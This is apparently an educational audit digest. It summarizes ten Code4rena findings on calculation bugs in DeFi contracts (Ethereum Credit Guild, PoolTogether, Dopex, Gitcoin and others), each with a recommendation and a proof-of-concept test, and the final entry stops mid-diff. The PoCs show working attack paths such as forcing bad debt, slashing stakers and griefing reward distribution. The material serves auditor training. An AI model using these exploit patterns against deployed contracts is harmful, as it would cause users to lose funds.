# ETAAcademy-Adudit: 4. Calculation

<table>
  <tr>
    <th>title</th>
    <th>tags</th>
  </tr>
  <tr>
    <td>04. Calculation</td>
    <td>
      <table>
        <tr>
          <th>audit</th>
          <th>basic</th>
          <th>Math</th>
          <td>calculation</td>
        </tr>
      </table>
    </td>
  </tr>
</table>

[Github](https://github.com/ETAAcademy)｜[Twitter](https://twitter.com/ETAAcademy)｜[ETA-Audit](https://github.com/ETAAcademy/ETAAcademy-Audit)

Authors: [Eta](https://twitter.com/pwhattie), looking forward to your joining

## 1.[High] The creation of bad debt (mark-down of Credit) can force other loans in auction to also create bad debt

### Calculating debt during auctions

- Summary: It only records the loan's debt at the start of an auction, using the current `creditMultiplier`. If the creditMultiplier changes during the auction, callDebt may underestimate the actual debt. This could lead to only accepting bids during the auction's second phase if the borrower's debt exceeds available credit. Additionally, if the debt surpasses available credit, bad debt may occur during the auction.
- Impact & Recommendation: All other loans in auction at that time will also be forced to create bad debt. It suggests dynamically calculating callDebt during auctions based on the current creditMultiplier, rather than using a fixed snapshot, for more accurate debt assessment.
  <br> 🐬: [Source](https://code4rena.com/reports/2023-12-ethereumcreditguild#h-03-the-creation-of-bad-debt-mark-down-of-credit-can-force-other-loans-in-auction-to-also-create-bad-debt) & [Report](https://code4rena.com/reports/2023-12-ethereumcreditguild)

  <details><summary>POC</summary>

  ```solidity

    // SPDX-License-Identifier: GPL-3.0-or-later
    pragma solidity 0.8.13;
    import {Clones} from "@openzeppelin/contracts/proxy/Clones.sol";
    import {Test} from "@forge-std/Test.sol";
    import {Core} from "@src/core/Core.sol";
    import {CoreRoles} from "@src/core/CoreRoles.sol";
    import {MockERC20} from "@test/mock/MockERC20.sol";
    import {SimplePSM} from "@src/loan/SimplePSM.sol";
    import {GuildToken} from "@src/tokens/GuildToken.sol";
    import {CreditToken} from "@src/tokens/CreditToken.sol";
    import {LendingTerm} from "@src/loan/LendingTerm.sol";
    import {AuctionHouse} from "@src/loan/AuctionHouse.sol";
    import {ProfitManager} from "@src/governance/ProfitManager.sol";
    import {RateLimitedMinter} from "@src/rate-limits/RateLimitedMinter.sol";
    contract BadDebtCreatesBadDebt is Test {
        address private governor = address(1);
        address private guardian = address(2);
        address staker = address(0x01010101);
        address borrower = address(0x02020202);
        address lender = address(0x03030303);
        Core private core;
        ProfitManager private profitManager;
        CreditToken credit;
        GuildToken guild;
        MockERC20 collateral;
        MockERC20 pegToken;
        SimplePSM private psm;
        RateLimitedMinter rlcm;
        AuctionHouse auctionHouse;
        LendingTerm term;
        // LendingTerm params (same as deployment script)
        uint256 constant _CREDIT_PER_COLLATERAL_TOKEN = 1e18; // 1:1
        uint256 constant _INTEREST_RATE = 0.04e18; // 4% APR
        uint256 constant _MAX_DELAY_BETWEEN_PARTIAL_REPAY = 0;
        uint256 constant _MIN_PARTIAL_REPAY_PERCENT = 0;
        uint256 constant _HARDCAP = 2_000_000e18; // 2 million
        uint256 public issuance = 0;
        function setUp() public {
            vm.warp(1679067867);
            vm.roll(16848497);
            core = new Core();
            profitManager = new ProfitManager(address(core));
            collateral = new MockERC20();
            pegToken = new MockERC20(); // 18 decimals for easy calculations (deployment script uses USDC which has 6 decimals)
            credit = new CreditToken(address(core), "name", "symbol");
            guild = new GuildToken(
                address(core),
                address(profitManager)
            );
            rlcm = new RateLimitedMinter(
                address(core) /*_core*/,
                address(credit) /*_token*/,
                CoreRoles.RATE_LIMITED_CREDIT_MINTER /*_role*/,
                0 /*_maxRateLimitPerSecond*/,
                0 /*_rateLimitPerSecond*/,
                uint128(_HARDCAP) /*_bufferCap*/
            );
            auctionHouse = new AuctionHouse(address(core), 650, 1800);
            term = LendingTerm(Clones.clone(address(new LendingTerm())));
            term.initialize(
                address(core),
                LendingTerm.LendingTermReferences({
                    profitManager: address(profitManager),
                    guildToken: address(guild),
                    auctionHouse: address(auctionHouse),
                    creditMinter: address(rlcm),
                    creditToken: address(credit)
                }),
                LendingTerm.LendingTermParams({
                    collateralToken: address(collateral),
                    maxDebtPerCollateralToken: _CREDIT_PER_COLLATERAL_TOKEN,
                    interestRate: _INTEREST_RATE,
                    maxDelayBetweenPartialRepay: _MAX_DELAY_BETWEEN_PARTIAL_REPAY,
                    minPartialRepayPercent: _MIN_PARTIAL_REPAY_PERCENT,
                    openingFee: 0,
                    hardCap: _HARDCAP
                })
            );
            psm = new SimplePSM(
                address(core),
                address(profitManager),
                address(credit),
                address(pegToken)
            );
            profitManager.initializeReferences(address(credit), address(guild), address(psm));
            // roles
            core.grantRole(CoreRoles.GOVERNOR, governor);
            core.grantRole(CoreRoles.GUARDIAN, guardian);
            core.grantRole(CoreRoles.CREDIT_MINTER, address(this));
            core.grantRole(CoreRoles.GUILD_MINTER, address(this));
            core.grantRole(CoreRoles.GAUGE_ADD, address(this));
            core.grantRole(CoreRoles.GAUGE_REMOVE, address(this));
            core.grantRole(CoreRoles.GAUGE_PARAMETERS, address(this));
            core.grantRole(CoreRoles.CREDIT_MINTER, address(rlcm));
            core.grantRole(CoreRoles.RATE_LIMITED_CREDIT_MINTER, address(term));
            core.grantRole(CoreRoles.GAUGE_PNL_NOTIFIER, address(term));
            core.grantRole(CoreRoles.CREDIT_MINTER, address(psm));
            core.grantRole(CoreRoles.CREDIT_REBASE_PARAMETERS, address(psm));
            core.renounceRole(CoreRoles.GOVERNOR, address(this));
            // add gauge
            guild.setMaxGauges(10);
            guild.addGauge(1, address(term));
        }
        function testBadDebtCreatesBadDebt() public {
            // staker increases term debtCeiling
            guild.mint(staker, 1000e18);
            vm.startPrank(staker);
            guild.incrementGauge(address(term), 1000e18);
            vm.stopPrank();
            assertEq(guild.getGaugeWeight(address(term)), 1000e18);
            // term has 12 active loans all with various borrow sizes (1_000_000 in total loans)
            // 1st loan = 80_000e18
            collateral.mint(borrower, 1_000_000e18);
            uint256[] memory borrowAmounts = new uint256[](11);
            bytes32[] memory loanIds = new bytes32[](11);
            borrowAmounts[0] = 1_000e18;
            borrowAmounts[1] = 5_000e18;
            borrowAmounts[2] = 10_000e18;
            borrowAmounts[3] = 25_000e18;
            borrowAmounts[4] = 100_000e18;
            borrowAmounts[5] = 50_000e18;
            borrowAmounts[6] = 300_000e18;
            borrowAmounts[7] = 18_000e18;
            borrowAmounts[8] = 90_000e18;
            borrowAmounts[9] = 250_000e18;
            borrowAmounts[10] = 71_000e18;
            vm.prank(borrower);
            collateral.approve(address(term), 1_000_000e18);
            // create 1st loan (loan that will create bad debt)
            bytes32 loanId;
            vm.startPrank(borrower);
            loanId = term.borrow(80_000e18, 80_000e18);
            vm.roll(block.number + 1);
            vm.warp(block.timestamp + 13);
            vm.stopPrank();
            // create the rest of the loans (loans that will be forced to create bad debt)
            for (uint256 i; i < borrowAmounts.length; i++) {
                vm.startPrank(borrower);
                loanIds[i] = term.borrow(borrowAmounts[i], borrowAmounts[i]);
                vm.roll(block.number + 1);
                vm.warp(block.timestamp + 13);
                vm.stopPrank();
            }

            assertEq(term.issuance(), 1_000_000e18);
            assertEq(credit.balanceOf(borrower), 1_000_000e18);
            assertEq(credit.totalSupply(), 1_000_000e18);
            // lenders supply 1_000_000 pegToken in psm (credit.totalSupply == 2_000_000)
            pegToken.mint(lender, 1_000_000e18);
            vm.startPrank(lender);
            pegToken.approve(address(psm), 1_000_000e18);
            psm.mintAndEnterRebase(1_000_000e18);
            vm.stopPrank();
            assertEq(credit.totalSupply(), 2_000_000e18);
            // half a year later all loans accrued ~2% interest
            vm.warp(block.timestamp + (term.YEAR() / 2));

            // term is offboarded
            guild.removeGauge(address(term));
            assertEq(guild.isGauge(address(term)), false);
            // one loan is called before the others and it creates bad debt (markdown > % interest owed by other loans)
            term.call(loanId);
            // no ones bids and loan creates bad debt (worse case scenario)
            vm.warp(block.timestamp + auctionHouse.auctionDuration());
            (, uint256 creditAsked) = auctionHouse.getBidDetail(loanId);
            assertEq(creditAsked, 0); // phase 2 ended
            // all loans called via callMany right before bad debt + markdown occurs
            // to demonstrate that any auctions live while markdown occurred would be affected (including auctions in diff terms)
            term.callMany(loanIds);
            // bad debt created, i.e. markdown of 4%
            // note that for demonstration purposes there are no surplus buffers
            auctionHouse.forgive(loanId);
            assertEq(term.issuance(), 1_000_000e18 - 80_000e18);
            assertEq(credit.totalSupply(), 2_000_000e18);
            assertEq(profitManager.creditMultiplier(), 0.96e18); // credit marked down
            // no one can bid during phase 1 of any other loans that were in auction when the markdown occurred
            // due to principle > creditFromBidder, therefore collateral to borrower must be 0, i.e. all collateral is offered, i.e. must be phase 2
            for (uint256 i; i < loanIds.length; i++) {
                ( , creditAsked) = auctionHouse.getBidDetail(loanIds[i]);
                // verify we are in phase 1 (creditAsked == callDebt)
                assertEq(auctionHouse.getAuction(loanIds[i]).callDebt, creditAsked);
                // attempt to bid during phase 1
                credit.mint(address(this), creditAsked);
                credit.approve(address(term), creditAsked);
                vm.expectRevert("LendingTerm: invalid collateral movement");
                auctionHouse.bid(loanIds[i]);
            }
            // fast forward to the beginning of phase 2
            vm.warp(block.timestamp + auctionHouse.midPoint());
            vm.roll(block.number + 1);
            // all other loans that are in auction will be forced to only receive bids in phase 2
            // bad debt is gauranteed to be created for all these loans, so user's are incentivized to
            // bid at the top of phase 2. This would result in the liquidator receiving the collateral at a discount.
            // The loans with less accrued interest and a bigger principle/borrow amount will result in a bigger loss, i.e. greater markdown
            emit log_named_uint("creditMultiplier before updates", profitManager.creditMultiplier());

            uint256 collateralReceived;
            for (uint256 i; i < loanIds.length; i++) {
                (collateralReceived, creditAsked) = auctionHouse.getBidDetail(loanIds[i]);
                // verify we are at the top of phase 2 (collateralReceived == collateralAmount | creditAsked == callDebt)
                assertEq(auctionHouse.getAuction(loanIds[i]).callDebt, creditAsked);
                assertEq(auctionHouse.getAuction(loanIds[i]).collateralAmount, collateralReceived);
                // bid at top of phase two (bidder receives collateral at a discount & protocol incurs more bad debt)
                credit.mint(address(this), creditAsked);
                credit.approve(address(term), creditAsked);
                auctionHouse.bid(loanIds[i]);
                multiplierUpdated();
            }
        }
        function multiplierUpdated() internal {
            // credit multiiplier decreases which each auction
            uint256 multiiplier = profitManager.creditMultiplier();
            emit log_named_uint("creditMultiplier updated", multiiplier);
        }
    }


  ```

  </details>

## 2.[High] Users staking via the SurplusGuildMinter can be immediately slashed when staking into a gauge that had previously incurred a loss

### Initialization user's lastLoss

- Summary: If the gauge has experienced a loss in the past, even if the user staked during a profitable period, they may be immediately slashed upon staking. This happens because the code initializes the user's stake struct with default values, which will identify this user as being slashed, i.e. slashed = true, due to lastGaugeLoss > userStake.lastGaugeLoss.

- Impact: The `SurplusGuildMinter` should initialize a user's **`lastGaugeLoss`** to the current block timestamp, so that comparisons with **`lastGaugeLoss`** won't be made against a freshly initialized user stake struct, preventing potential issues with loss of stake and rewards.
  <br> 🐬: [Source](https://code4rena.com/reports/2023-12-ethereumcreditguild#h-04-users-staking-via-the-surplusguildminter-can-be-immediately-slashed-when-staking-into-a-gauge-that-had-previously-incurred-a-loss) & [Report](https://code4rena.com/reports/2023-12-ethereumcreditguild)

  <details><summary>POC</summary>

  ```solidity
      function testUserImmediatelySlashed() public {
        // initial state
        assertEq(guild.getGaugeWeight(term), 50e18);
        // add credit to surplus buffer
        credit.mint(address(this), 100e18);
        credit.approve(address(profitManager), 50e18);
        profitManager.donateToSurplusBuffer(50e18);
        // term incurs loss
        profitManager.notifyPnL(term, -50e18);
        assertEq(guild.lastGaugeLoss(term), block.timestamp);
        // term offboarded
        guild.removeGauge(term);
        assertEq(guild.isGauge(term), false);
        // time passes and term is re-onboarded
        vm.roll(block.number + 100);
        vm.warp(block.timestamp + (100 * 13));
        guild.addGauge(1, term);
        assertEq(guild.isGauge(term), true);
        // user stakes into term directly
        address user = address(0x01010101);
        guild.mint(user, 10e18);
        vm.startPrank(user);
        guild.incrementGauge(term, 10e18);
        vm.stopPrank();
        // user can un-stake from term
        vm.startPrank(user);
        guild.decrementGauge(term, 10e18);
        vm.stopPrank();
        // user stakes into term via sgm
        credit.mint(user, 10e18);
        vm.startPrank(user);
        credit.approve(address(sgm), 10e18);
        sgm.stake(term, 10e18);
        vm.stopPrank();

        // check after-stake state
        assertEq(credit.balanceOf(user), 0);
        assertEq(profitManager.termSurplusBuffer(term), 10e18);
        assertEq(guild.getGaugeWeight(term), 70e18);
        SurplusGuildMinter.UserStake memory userStake = sgm.getUserStake(user, term);
        assertEq(uint256(userStake.stakeTime), block.timestamp);
        assertEq(userStake.lastGaugeLoss, guild.lastGaugeLoss(term));
        assertEq(userStake.profitIndex, 0);
        assertEq(userStake.credit, 10e18);
        assertEq(userStake.guild, 20e18);
        // malicious actor is aware of bug and slashes the user's stake immediately, despite no loss occurring in the gauge
        sgm.getRewards(user, term);
        // check after-getReward state (user was slashed even though no loss has occurred since term was re-onboarded)
        assertEq(credit.balanceOf(user), 0);
        assertEq(profitManager.termSurplusBuffer(term), 10e18);
        assertEq(guild.getGaugeWeight(term), 70e18);
        userStake = sgm.getUserStake(user, term);
        assertEq(uint256(userStake.stakeTime), 0);
        assertEq(userStake.lastGaugeLoss, 0);
        assertEq(userStake.profitIndex, 0);
        assertEq(userStake.credit, 0);
        assertEq(userStake.guild, 0);
        // user tries to unstake but will not receive anything
        uint256 userBalanceBefore = credit.balanceOf(user);
        vm.startPrank(user);
        sgm.unstake(term, 10e18);
        vm.stopPrank();
        uint256 userAfterBalance = credit.balanceOf(user);
        assertEq(userBalanceBefore, 0);
        assertEq(userAfterBalance, 0);
    }

  ```

  </details>

## 3.[Medium] Anyone can prolong the time for the rewards to get distributed

### Minimum distribution

- Summary: each time the distribute call occurs, the endTimestamp gets extended. An attacker could exploit this by repeatedly calling distribute(1) to distribute 1 wei of a credit token daily, thereby extending the distribution period by approximately three times.

- Impact & Recommendation: Add a minimum required amount for calling distribute if it's not done by the ProfitManager, or change how rewards are interpolated.
  <br> 🐬: [Source](https://code4rena.com/reports/2023-12-ethereumcreditguild#m-12-anyone-can-prolong-the-time-for-the-rewards-to-get-distributed) & [Report](https://code4rena.com/reports/2023-12-ethereumcreditguild)

  <details><summary>POC</summary>

  ```solidity

    function testProlongDistribution() public {
        token.mint(alice, 10e18);
        token.mint(bobby, 20e18);
        vm.prank(alice);
        token.enterRebase();
        vm.prank(bobby);
        token.enterRebase();
        token.mint(address(this), 41e18);
        // Distribute 40 tokens
        uint256 amountToDistribute = 40e18;
        token.distribute(amountToDistribute);

        // Attackers calls distribute(1) each day to only distribute 1 wei of a token
        for(uint256 i = 0; i < 30; i++) {
            vm.warp(block.timestamp + 1 days);
            token.distribute(1);
        }
        uint256 distributedSupply = amountToDistribute - token.pendingDistributedSupply();
        console.log("Distributed supply after 30 days:");
        console.log("----------------------------------------------------");
        console.log("Distributed supply         : ", distributedSupply);
        console.log("Expected distributes supply: ", amountToDistribute);
        for(uint256 i = 0; i < 60; i++) {
            vm.warp(block.timestamp + 1 days);
            token.distribute(1);
        }
        console.log();
        distributedSupply = amountToDistribute - token.pendingDistributedSupply();
        console.log("Distributed supply after 90 days:");
        console.log("----------------------------------------------------");
        console.log("Distributed supply         : ", distributedSupply);
        console.log("Expected distributes supply: ", amountToDistribute);
    }

  ```

  </details>

## 4.[High] Any fee claim lesser than the total yieldFeeBalance as unit of shares is lost and locked in the PrizeVault contract

### Fee claimed less than the accrued balance

- Summary: If the fee claimed is less than the accrued balance, the remaining funds are locked in the PrizeVault with no way to retrieve them.

- Impact & Recommendation: If they claim less than the full amount, they forfeit the remainder, which can lead to loss of funds if not claimed in full. It is recommended to adjust the `claimYieldFeeShares` to only deduct the amount claimed/minted.
  <br> 🐬: [Source](https://code4rena.com/reports/2024-03-pooltogether#h-01-any-fee-claim-lesser-than-the-total-yieldfeebalance-as-unit-of-shares-is-lost-and-locked-in-the-prizevault-contract) & [Report](https://code4rena.com/reports/2024-03-pooltogether)

  <details><summary>POC</summary>

  ```solidity
    function testUnclaimedFeesLostPOC() public {
        vault.setYieldFeePercentage(1e8); // 10%
        vault.setYieldFeeRecipient(bob); // fee recipient bob
        assertEq(vault.totalDebt(), 0); // no deposits in vault yet
        // alice makes an initial deposit of 100 WETH
        underlyingAsset.mint(alice, 100e18);
        vm.startPrank(alice);
        underlyingAsset.approve(address(vault), 100e18);
        vault.deposit(100e18, alice);
        vm.stopPrank();
        console.log("Shares balance of Alice post mint: ", vault.balanceOf(alice));
        assertEq(vault.totalAssets(), 100e18);
        assertEq(vault.totalSupply(), 100e18);
        assertEq(vault.totalDebt(), 100e18);
        // mint yield to the vault and liquidate
        underlyingAsset.mint(address(vault), 100e18);
        vault.setLiquidationPair(address(this));
        uint256 maxLiquidation = vault.liquidatableBalanceOf(address(underlyingAsset));
        uint256 amountOut = maxLiquidation / 2;
        uint256 yieldFee = (100e18 - vault.yieldBuffer()) / (2 * 10); // 10% yield fee + 90% amountOut = 100%
        vault.transferTokensOut(address(0), bob, address(underlyingAsset), amountOut);
        console.log("Accrued yield post in the contract to be claimed by Bob: ", vault.yieldFeeBalance());
        console.log("Yield fee: ", yieldFee);
        // yield fee: 4999999999999950000
        // alice mint: 100000000000000000000
        assertEq(vault.totalAssets(), 100e18 + 100e18 - amountOut); // existing balance + yield - amountOut
        assertEq(vault.totalSupply(), 100e18); // no change in supply since liquidation was for assets
        assertEq(vault.totalDebt(), 100e18 + yieldFee); // debt increased since we reserved shares for the yield fee
        vm.startPrank(bob);
        vault.claimYieldFeeShares(1e17);

        console.log("Accrued yield got reset to 0: ", vault.yieldFeeBalance());
        console.log("But the shares minted to Bob (yield fee recipient) should be 4.9e18 but he only has 1e17 and the rest is lost: ", vault.balanceOf(bob));
        // shares bob: 100000000000000000
        assertEq(vault.totalDebt(), vault.totalSupply());
        assertEq(vault.yieldFeeBalance(), 0);
        vm.stopPrank();
    }

  ```

  </details>

## 5.[Medium] LiquidInfrastructureERC20.sol disapproved holders keep part of the supply, diluting approved holders revenue

### Dilute revenue

- Summary: Disapproving a holder in the LiquidInfrastructureERC20 contract stops them from receiving revenue, but they still keep part of the token supply, diluting revenue for approved holders. This happens because entitlements per token are calculated based on the total supply and ERC20 balances in the contract.

- Impact & Recommendation: To prevent dilution of revenue, burn tokens of disapproved holders in LiquidInfrastructureERC20. Track their balance at disapproval and mint the same amount upon reapproval.
  <br> 🐬: [Source](https://code4rena.com/reports/2024-02-althea-liquid-infrastructure#m-01-liquidinfrastructureerc20sol-disapproved-holders-keep-part-of-the-supply-diluting-approved-holders-revenue) & [Report](https://code4rena.com/reports/2024-02-althea-liquid-infrastructure)

  <details><summary>POC</summary>

  ```solidity
    function test_dilutedDistribution() public {
        address nftOwner1 = makeAddr("nftOwner1");
        uint256 rewardAmount1 = 1000000;
        nftOwners = [nftOwner1];
        vm.prank(nftOwner1);
        LiquidInfrastructureNFT nft1 = new LiquidInfrastructureNFT("nftAccount1");
        nfts = [nft1];
        // Register one NFT as a source of reward erc20s
        uint256 accountId = nft1.AccountId();
        thresholdAmounts = [0];
        // Transfer the NFT to ERC20 and manage
        vm.startPrank(nftOwner1);
        nft1.setThresholds(erc20Addresses, thresholdAmounts);
        nft1.transferFrom(nftOwner1, address(infraERC20), accountId);

        vm.stopPrank();
        assertEq(nft1.ownerOf(accountId), address(infraERC20));
        vm.expectEmit(address(infraERC20));
        emit AddManagedNFT(address(nft1));
        vm.startPrank(erc20Owner);
        infraERC20.addManagedNFT(address(nft1));
        vm.roll(1);
        // Allocate rewards to the NFT
        erc20A.transfer(address(nft1), rewardAmount1);
        assertEq(erc20A.balanceOf(address(nft1)), rewardAmount1);
        // And then send the rewards to the ERC20
        infraERC20.withdrawFromAllManagedNFTs();
        // Approve holders
        infraERC20.approveHolder(address(holder1));
        infraERC20.approveHolder(address(holder2));
        // Mint LiquidInfrastructureERC20 tokens to holders
        // 200 total supply of LiquidInfrastructureERC20 tokens
        infraERC20.mint(address(holder1), 100);
        infraERC20.mint(address(holder2), 100);
        // Wait for the minimum distribution period to pass
        vm.roll(vm.getBlockNumber() + 500);
        // Distribute revenue to holders
        infraERC20.distributeToAllHolders();
        console.log("First distribution (2 approved holders) \n  balance of holder 1: %s", erc20A.balanceOf(address(holder1)));
        console.log("balance of holder 2: %s", erc20A.balanceOf(address(holder2)));
        console.log("balance remaining in infraERC20: %s", erc20A.balanceOf(address(infraERC20)));
        // Wait for the minimum distribution period to pass
        vm.roll(vm.getBlockNumber() + 500);
        // Allocate more rewards to the NFT
        erc20A.transfer(address(nft1), rewardAmount1);
        infraERC20.withdrawFromAllManagedNFTs();
        // Holder 2 is no longer approved
        infraERC20.disapproveHolder(address(holder2));
        // Now there is 1 holder remaining, but the rewards are diluted
        infraERC20.distributeToAllHolders();
        console.log("\n  Second distribution (1 approved holder) \n  balance of holder 1: %s", erc20A.balanceOf(address(holder1)));
        console.log("balance of holder 2: %s", erc20A.balanceOf(address(holder2)));
        // There is remaining unallocated rewards in the contract
        console.log("balance remaining in infraERC20: %s", erc20A.balanceOf(address(infraERC20)));
        // holder 2 has 100 LiquidInfrastructureERC20 tokens, this dilutes the rewards
        assertEq(infraERC20.balanceOf(address(holder2)), 100);
        // Wait for the minimum distribution period to pass
        vm.roll(vm.getBlockNumber() + 500);
        // Distribute revenue to holders
        infraERC20.distributeToAllHolders();
        console.log("\n  Third distribution (1 approved holder) \n  balance of holder 1: %s", erc20A.balanceOf(address(holder1)));
        console.log("balance of holder 2: %s", erc20A.balanceOf(address(holder2)));
        console.log("balance remaining in infraERC20: %s", erc20A.balanceOf(address(infraERC20)));
    }

  ```

  </details>

## 6.[High] Improper precision of strike price calculation can result in broken protocol

### Calculation precision

- Summary: Due to precision issues, the protocol's calculation of the strike price for a PUT option on rDPX is flawed. The rounding function used imposes a minimum value, leading to incorrect premium calculations. For instance, a strike price intended to be 25% out-of-the-money (OTM) is rounded up, resulting in an in-the-money (ITM) strike price and inflated premiums.

- Impact & Recommendation: The value of the `roundingPrecision` is too high considering reasonable market prices of ETH and rDPX. Consider decreasing it.
  <br> 🐬: [Source](https://code4rena.com/reports/2023-08-dopex#h-01-improper-precision-of-strike-price-calculation-can-result-in-broken-protocol) & [Report](https://code4rena.com/reports/2023-08-dopex)

  <details><summary>POC</summary>

  ```solidity
    /// @dev the precision to round up to
    uint256 public roundingPrecision = 1e6;

    ...
      uint256 strike = IPerpetualAtlanticVault(addresses.perpetualAtlanticVault)
      .roundUp(rdpxPrice - (rdpxPrice / 4)); // 25% below the current price
    ...

    function roundUp(uint256 _strike) public view returns (uint256 strike) {
        uint256 remainder = _strike % roundingPrecision;
        if (remainder == 0) {
        return _strike;
        } else {
        return _strike - remainder + roundingPrecision;
        }
   }

  ```

  </details>

## 7.[High] The peg stability module can be compromised by forcing lowerDepeg to revert

### update the totalWethDelegated

- Summary: 1) The attacker calls the addToDelegate function and deposits WETH into the rpdxV2Core contract, increasing the totalWethDelegated state variable. 2) Subsequently, the attacker calls the withdraw function, which does not update the totalWethDelegated variable, leaving it inflated. 3) The attacker then calls the sync function, inaccurately updating the WETH reserves by subtracting the inflated totalWethDelegated value. 4) When the admin attempts to restore the dpxETH/ETH peg by calling the lowerDepeg function, it reverts due to an underflow error caused by the manipulated WETH reserves.

- Impact & Recommendation: Update the totalWethDelegated in the `withdraw` function.
  <br> 🐬: [Source](https://code4rena.com/reports/2023-08-dopex#h-08-the-peg-stability-module-can-be-compromised-by-forcing-lowerdepeg-to-revert) & [Report](https://code4rena.com/reports/2023-08-dopex)

  <details><summary>POC</summary>

  ```solidity
      function testOptionPricingRevert() public {
        OptionPricingSimple optionPricingSimple;
        optionPricingSimple = new OptionPricingSimple(100, 5e6);
        (uint256 rdpxRequired, uint256 wethRequired) = rdpxV2Core
            .calculateBondCost(1 * 1e18, 0);
        uint256 currentPrice = vault.getUnderlyingPrice(); // price of underlying wrt collateralToken
        uint256 strike = vault.roundUp(currentPrice - (currentPrice / 4)); // 25% below the current price
        // around 14 minutes before next funding payment
        vm.warp(block.timestamp + 7 days - 863 seconds);
        uint256 timeToExpiry = vault.nextFundingPaymentTimestamp() -
            block.timestamp;
        console.log("What is the current price");
        console.log(currentPrice);
        console.log("What is the strike");
        console.log(strike);
        console.log("What is time to expiry");
        console.log(timeToExpiry);
        uint256 price = vault.getUnderlyingPrice();
        // will revert
        vm.expectRevert();
        optionPricingSimple.getOptionPrice(strike, price, 100, timeToExpiry);
    }

  ```

  </details>

## 8.[High] userTotalStaked invariant will be broken due to vulnerable implementations in release()

### Not properly update the userTotalStaked

- Summary: The release() function in the IdentityStaking contract does not properly update the userTotalStaked invariant, potentially leading to underflow errors in withdraw methods and resulting in users losing funds. This occurs because userTotalStaked is not updated when selfStakes[address].amount or communityStakes[address][x].amount are updated.

- Impact & Recommendation: In `release()`, also update `userTotalStaked`.
  <br> 🐬: [Source](https://code4rena.com/reports/2024-03-gitcoin#h-01-usertotalstaked-invariant-will-be-broken-due-to-vulnerable-implementations-in-release) & [Report](https://code4rena.com/reports/2024-03-gitcoin)

  <details><summary>POC</summary>

  ```solidity
    it.only("userTotalStaked is broken, user lose funds", async function(){
    //Step2: Round1 - slash Alice's self and community stake of 80000 each
    await this.identityStaking
    .connect(this.owner)
    .slash(
        this.selfStakers.slice(0, 1),
        this.communityStakers.slice(0, 1),
        this.communityStakees.slice(0, 1),
        80,
    );
    //Step2: Round1 - Alice's community/self stake is 20000 after slashing
    expect(
        (
        await this.identityStaking.communityStakes(
            this.communityStakers[0],
            this.communityStakees[0],
        )
        ).amount,
    ).to.equal(20000);
    //Step2: Round1 - total slashed amount 80000 x 2
    expect(await this.identityStaking.totalSlashed(1)).to.equal(160000);
    //Step3: Round1 - Alice appealed and full slash amount is released 80000 x 2
    await this.identityStaking
    .connect(this.owner)
    .release(this.selfStakers[0], this.selfStakers[0], 80000, 1);
    await this.identityStaking
    .connect(this.owner)
    .release(this.communityStakers[0], this.communityStakees[0], 80000, 1);
    //Step3: Round1 - After release, Alice has full staked balance 100000 x 2
    expect((await this.identityStaking.selfStakes(this.selfStakers[0])).amount).to.equal(100000);
    expect((await this.identityStaking.communityStakes(this.communityStakers[0],this.communityStakees[0])).amount).to.equal(100000);
    expect(await this.identityStaking.totalSlashed(1)).to.equal(0);
    // Alice's lock expired
    await time.increase(twelveWeeksInSeconds + 1);
    //Step4: Alice trying to withdraw 100000 x 2 from selfStake and communityStake. Tx reverted with underflow error.
    await  expect((this.identityStaking.connect(this.userAccounts[0]).withdrawSelfStake(100000))).to.be.revertedWithPanic(PANIC_CODES.ARITHMETIC_UNDER_OR_OVERFLOW);
    await  expect((this.identityStaking.connect(this.userAccounts[0]).withdrawCommunityStake(this.communityStakees[0],100000))).to.be.revertedWithPanic(PANIC_CODES.ARITHMETIC_UNDER_OR_OVERFLOW);
    //Step4: Alice could only withdraw 20000 x 2. Alice lost 80000 x 2.
    await this.identityStaking.connect(this.userAccounts[0]).withdrawSelfStake(20000);
    await this.identityStaking.connect(this.userAccounts[0]).withdrawCommunityStake(this.communityStakees[0],20000);
    })

  ```

  </details>

## 9. [Medium] Erroneous probability calculation in physical attributes can lead to significant issues

### Wrong inclusion of boundary

- Summary: The AiArenaHelper contract calculates user attributes using a rarityRank from their DNA. A bug in the dnaToIndex function, which uses cumProb >= rarityRank instead of cumProb > rarityRank, causes the first attribute to be slightly more likely (by 1%) and the last attribute slightly less likely (by 1%) than intended. In cases with extreme probabilities, this can significantly distort the rarity distribution, either doubling the chance of rare attributes or making them impossible to obtain.

- Impact & Recommendation: Correcting it to cumProb > rarityRank results in a 50% chance for both attributes, fixing the imbalance and ensuring accurate probability distribution.
  <br> 🐬: [Source](https://code4rena.com/reports/2024-02-ai-arena#m-07-erroneous-probability-calculation-in-physical-attributes-can-lead-to-significant-issues) & [Report](https://code4rena.com/reports/2024-02-ai-arena)

  <details><summary>POC</summary>

  ```solidity
                  } else {
                    uint256 rarityRank = (dna / attributeToDnaDivisor[attributes[i]]) % 100;
                    uint256 attributeIndex = dnaToIndex(generation, rarityRank, attributes[i]);
                    finalAttributeProbabilityIndexes[i] = attributeIndex;
                }



     /// @dev Convert DNA and rarity rank into an attribute probability index.
     /// @param attribute The attribute name.
     /// @param rarityRank The rarity rank.
     /// @return attributeProbabilityIndex attribute probability index.
    function dnaToIndex(uint256 generation, uint256 rarityRank, string memory attribute)
        public
        view
        returns (uint256 attributeProbabilityIndex)
    {
        uint8[] memory attrProbabilities = getAttributeProbabilities(generation, attribute);

        uint256 cumProb = 0;
        uint256 attrProbabilitiesLength = attrProbabilities.length;
        for (uint8 i = 0; i < attrProbabilitiesLength; i++) {
            cumProb += attrProbabilities[i];
            if (cumProb >= rarityRank) {
                attributeProbabilityIndex = i + 1;
                break;
            }
        }
        return attributeProbabilityIndex;
    }


  ```

  </details>

## 10. [High] `_vested()` claimable amount calculation error

### `_vested()` calculation

- Summary: The `_vested()` method calculates claimable amounts but doesn't properly consider the `__initialUnlockTimeOffset`, leading to potential overestimations. This flaw can cause calculated results to exceed maximum amounts, leading to unexpected behavior in vesting contracts.
- Impact & Recommendation: Adjust the conditional statement to `if (block.timestamp >= _start -  __initialUnlockTimeOffset + _duration) return _totalAmount; // Fully vested`
  <br> 🐬: [Source](https://code4rena.com/reports/2024-02-tapioca#h-10-adversary-can-steal-approved-tolps-to-magnetar-via-_paricipateontolp) & [Report](https://code4rena.com/reports/2024-02-tapioca)

  <details><summary>POC</summary>

  ```solidity
        function _vested(uint256 _totalAmount) internal view returns (uint256) {
            uint256 _cliff = cliff;
            uint256 _start = start;
            uint256 _duration = duration;
            if (_start == 0) return 0; // Not started
            if (_cliff > 0) {
                _start = _start + _cliff; // Apply cliff offset
                if (block.timestamp < _start) return 0; // Cliff not reached
            }


  -       if (block.timestamp >= _start + _duration) return _totalAmount; // Fully vested

